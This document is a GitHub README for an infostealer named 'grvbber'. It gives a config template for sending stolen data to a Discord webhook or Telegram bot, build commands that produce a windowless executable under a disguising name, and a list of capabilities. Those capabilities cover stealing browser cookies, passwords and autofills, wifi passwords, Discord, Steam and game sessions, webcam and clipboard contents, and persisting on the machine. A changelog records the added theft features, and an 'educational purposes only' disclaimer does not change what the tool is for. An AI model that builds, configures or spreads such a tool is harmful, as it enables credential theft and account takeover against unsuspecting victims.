NOTE TO GITHUB. THIS IS FOR EDUCATIONAL PURPOSES ONLY. don't smite ts pls

this has the shittiest builder known to mankind. if you're experiencing any difficulties with the builder then just paste this into config.py and edit it
```python
type = 'discord' #or 'telegram'
hook = 'replace_with_webhook_url' 
tg_token = 'replace_with_telegram_bot_token' 
tg_chat = 'replace_with_telegram_chat_id'
browsers = True #(or False)
discordacc = False #(or True)
games = False #(or True)
webcam = False #(or true)
```
then type this in command prompt
```
pip install pyinstaller
pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py 
```

credits to https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor and https://github.com/runassu/chrome_v20_decryption for chromium v20 decryption

<br>capabilities</br>
- Gets cookies (chromium/firefox)
- Gets passwords (chromium/firefox)
- Gets autofills (chromium/firefox)
- Gets browsing history (chromium/firefox)
- Gets discord accounts (no billing info and subscription info)
- Gets system information and ip address
- Screenshots the system
- Gets wifi passwords
- Gets minecraft and steam sessions (no session validating yet)
- Gets geometry dash sessions
- Persistence
- Webhook/Telegram Bot encryption (planned)
- Posts info to discord/telegram
- Gets webcam
- Gets MAC addresses
- Gets processes
- Blocks antivirus websites (planned)
- VM Detection (planned)

i also plan on improving the builder and not making it console based

changelog 2026-04-06:
- fixed browser data collection not being optional
- added geometry dash session st34ling 

changelog 2026-04-07:
- added v20 support; although i kinda stole it (only for 10 browsers)
- fixed the cookie expiry being hardcoded
- added fluxer support in builder
- fixed persistence blocking the other functions

changelog 2026-05-02:
- fixed cookie netscape format

changelog 2026-05-20:
- fixed system info and ip address not being logged on devices that aren't laptops

changelog 2026-05-26:
- added config.vdf for steam session stealing

changelog 2026-05-29:
- remade system info logic
- added webcam logging
- added clipboard logging
- added process logging
- fixed an error where if the c2 is telegram, it wouldn't show the full config display
- computer name and username now uses environment variables
